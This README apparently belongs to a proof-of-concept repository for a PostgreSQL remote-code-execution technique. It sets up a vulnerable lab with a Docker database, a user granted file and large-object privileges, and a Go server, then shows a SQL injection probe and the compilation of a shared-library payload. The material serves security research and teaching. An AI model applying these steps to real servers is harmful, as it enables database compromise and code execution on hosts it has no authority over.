# PostgreSQL RCE PoC via nested SQLi queries
This is a supporting material for my article at my [website](https://adeadfed.com/posts/postgresql-select-only-rce/). Go check it out if you haven't already!

### Setting up the server
1. Install the Postgresql Docker container
```
docker run --name poc-postgres-sqli-rce -p 5432:5432 -e POSTGRES_PASSWORD=mysecretpassword -d postgres
```
2. Connect to the DB and create `poc_user` with limited DB permissions 
```
CREATE USER poc_user WITH PASSWORD 'poc_pass'

GRANT pg_read_server_files TO poc_user
GRANT pg_write_server_files TO poc_user

GRANT USAGE ON SCHEMA public TO poc_user
GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE pg_largeobject TO poc_user

GRANT EXECUTE ON FUNCTION lo_export(oid, text) TO poc_user
GRANT EXECUTE ON FUNCTION lo_import(text, oid) TO poc_user
```
3. Clone the repo and run this Go module
```
git clone https://github.com/adeadfed/psql-golang-rce-poc
cd psql-golang-rce-poc/go_server
go run poc
```

### SQLi PoC
```
curl http://localhost:8000/phrases?id=1'
```

### Compiling the shared library
1. Install correct dev dependencies for the major version of the vulnerable PSQL server
```
sudo apt install postgresql-13 postgresql-server-dev-13 -y 
```
2. Compile the lib with gcc
```
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
